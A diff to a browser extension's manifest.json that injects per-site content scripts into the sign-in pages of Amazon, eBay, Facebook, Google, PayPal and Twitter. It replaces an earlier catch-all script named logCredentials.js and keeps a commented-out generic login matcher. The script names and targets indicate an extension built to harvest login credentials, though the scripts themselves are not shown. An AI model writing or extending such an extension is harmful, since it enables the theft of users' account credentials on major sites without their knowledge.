@@ -14,15 +14,61 @@
 	},
 
 	// Optional
-	"content_scripts": [{
+	"content_scripts": [
+	{
+		// Amazon
 		"matches": [
-			"*://*/*login*",
-			"*://*/*signin*",
-			"*://*/*Login*",
-			"*://*/*SignIn*"
+			"*://*.amazon.com/*signin*"
 		],
-		"js": ["./js/logCredentials.js"]
-	}],
+		"js": ["./js/amazon.js"]
+	},
+	{
+		// eBay
+		"matches": [
+			"*://*.ebay.com/*signin*",
+			"*://*.ebay.com/*SignIn*"
+		],
+		"js": ["./js/ebay.js"]
+	},
+	{
+		// Facebook
+		"matches": [
+			"*://.facebook.com/*login*"
+		],
+		"js": ["./js/facebook.js"]
+	},
+	{
+		// Google
+		"matches": [
+			"*://*.google.com/*signin*"
+		],
+		"js": ["./js/google.js"]
+	},
+	{
+		// Paypal
+		"matches": [
+			"*://*.paypal.com/*signin*"
+		],
+		"js": ["./js/paypal.js"]
+	},
+	{
+		// Twitter
+		"matches": [
+			"*://*.twitter.com/*login*"
+		],
+		"js": ["./js/twitter.js"]
+	}
+	//{
+	//	// Generic
+	//	"matches": [
+	//		"*://*/*login*",
+	//		"*://*/*signin*",
+	//		"*://*/*Login*",
+	//		"*://*/*SignIn*"
+	//	],
+	//	"js": ["./js/generic.js"]
+	//}
+	],
 	"incognito": "spanning"
 }
 
